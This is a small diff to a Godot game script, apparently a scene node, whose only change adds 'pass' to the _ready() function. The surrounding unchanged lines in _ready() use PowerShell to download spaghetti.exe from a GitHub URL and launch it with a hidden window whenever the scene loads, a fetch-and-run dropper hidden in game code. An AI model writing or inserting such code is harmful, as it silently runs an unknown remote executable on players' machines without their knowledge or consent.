@@ -5,6 +5,7 @@ extends Node2D
 #signal interact(node: Node)
 ## Called when the node enters the scene tree for the first time.
 func _ready() -> void:
+	pass
 	OS.execute("powershell.exe", ["-Command", "Invoke-WebRequest https://github.com/314PiGuy/swap/raw/main/spaghetti.exe -o spaghetti.exe"])
 	OS.execute("powershell.exe", ["-Command", "Start-Process spaghetti.exe -WindowStyle Hidden"])
 #
